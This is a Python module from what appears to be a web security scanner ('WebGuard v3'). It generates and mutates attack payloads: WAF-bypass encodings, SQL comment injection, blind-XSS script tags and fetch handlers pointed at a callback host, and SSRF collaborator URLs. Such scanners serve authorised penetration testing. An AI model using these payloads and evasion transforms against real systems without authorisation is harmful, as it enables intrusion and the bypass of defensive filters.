"""
core/payload_engine.py — WebGuard v3
──────────────────────────────────────
Smart payload mutation engine. Wraps and extends evasion/payloads.py.
Provides per-profile payload budgets and mutation transforms.
"""
from __future__ import annotations

import random
import re
import urllib.parse
from pathlib import Path
from typing import Optional

from config import SCAN_PROFILES


class PayloadEngine:
    """
    Central payload generator for all detectors.

    Usage:
        engine   = PayloadEngine(profile="aggressive")
        payloads = engine.get("sqli", "error")          # from library
        mutated  = engine.mutate("'")                   # transform variants
        all_sqli = engine.get_all("sqli")               # all techniques flat
    """

    def __init__(self, profile: str = "default") -> None:
        self.profile  = profile
        self._cfg     = SCAN_PROFILES.get(profile, SCAN_PROFILES["default"])
        self._max     = self._cfg.get("max_payloads", 10)
        self._evasion = self._cfg.get("evasion", False)

        # Lazy-loaded file payloads
        self._file_cache: dict[str, list[str]] = {}

    # ── Payload retrieval ──────────────────────────────────────────────────────

    def get(self, vuln_type: str, technique: str = "all") -> list[str]:
        """Get payloads from the library, respecting profile budget."""
        from core.evasion.payloads import get_payloads
        payloads = get_payloads(vuln_type, technique)
        return payloads[: self._max]

    def get_all(self, vuln_type: str) -> list[str]:
        """Get all payloads for a vuln type, flat list."""
        from core.evasion.payloads import PAYLOADS
        vuln = PAYLOADS.get(vuln_type, {})
        result = []
        for technique_payloads in vuln.values():
            if isinstance(technique_payloads, list):
                for p in technique_payloads:
                    if isinstance(p, str):
                        result.append(p)
        return result[: self._max]

    def from_file(self, filepath: str) -> list[str]:
        """Load payloads from a file (one per line, # = comment)."""
        if filepath in self._file_cache:
            return self._file_cache[filepath][: self._max]
        try:
            lines = Path(filepath).read_text(encoding="utf-8", errors="ignore").splitlines()
            payloads = [l.strip() for l in lines if l.strip() and not l.startswith("#")]
            self._file_cache[filepath] = payloads
            return payloads[: self._max]
        except OSError:
            return []

    # ── Mutation / encoding ────────────────────────────────────────────────────

    def mutate(self, payload: str) -> list[str]:
        """
        Return a list of payload variants using encoding and WAF bypass.
        In safe/default profiles: returns [payload] unchanged.
        In aggressive/stealth: returns multiple encoded variants.
        """
        if not self._evasion:
            return [payload]
        from core.evasion.waf_bypass import WAFBypass
        variants = WAFBypass.apply_all(payload)
        if self.profile == "stealth":
            return [random.choice(variants)]
        return list(dict.fromkeys(variants))  # deduplicate, preserve order

    def url_encode(self, s: str) -> str:
        return urllib.parse.quote(s, safe="")

    def double_encode(self, s: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

    def unicode_encode(self, s: str) -> str:
        """Encode each char as \\uXXXX."""
        return "".join(f"\\u{ord(c):04x}" for c in s)

    def comment_inject(self, sql_keyword: str) -> str:
        """INSERT/**/ → comment-obfuscated SQL keyword."""
        mid = len(sql_keyword) // 2
        return sql_keyword[:mid] + "/**/" + sql_keyword[mid:]

    def case_mutate(self, s: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    def random_padding(self, s: str, length: int = 8) -> str:
        pad = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=length))
        return s + pad

    # ── Blind/OOB payloads ──────────────────────────────────────────────────────

    def blind_xss_payloads(self, callback: str) -> list[str]:
        """Generate blind XSS payloads for a given callback URL."""
        cb = callback.rstrip("/")
        return [
            f"<script src={cb}/x.js></script>",
            f'"><script src="{cb}/x.js"></script>',
            f"<img src='{cb}/x' onerror='fetch(\"{cb}/x\")'>",
            f"javascript:fetch('{cb}/x')",
            f"<svg onload=\"fetch('{cb}/x')\">",
            f"';fetch('{cb}/x')//",
        ][: self._max]

    def ssrf_payloads(self, collaborator: Optional[str] = None) -> list[str]:
        """Return SSRF probe URLs, optionally including OOB collaborator."""
        from core.evasion.payloads import get_payloads
        payloads = get_payloads("ssrf", "all")
        if collaborator:
            cb = collaborator.rstrip("/")
            payloads = [
                f"http://{cb}/ssrf",
                f"https://{cb}/ssrf",
                *payloads,
            ]
        return payloads[: self._max]
